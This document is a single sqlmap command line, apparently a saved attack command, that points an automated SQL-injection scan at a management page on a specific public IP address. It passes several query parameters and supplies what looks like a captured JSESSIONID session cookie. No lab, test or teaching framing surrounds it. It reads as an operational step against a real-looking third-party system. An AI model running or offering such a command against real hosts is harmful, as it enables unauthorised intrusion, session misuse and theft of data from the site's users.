sqlmap -u "http://61.158.140.6/colorring/manager/ring_user/myTimeRing_day.jsp?craccount=11111111111&isCrm=0&pright=1-6" --cookie="JSESSIONID=8ED58348452BEAC7B007A427230FD9AC"
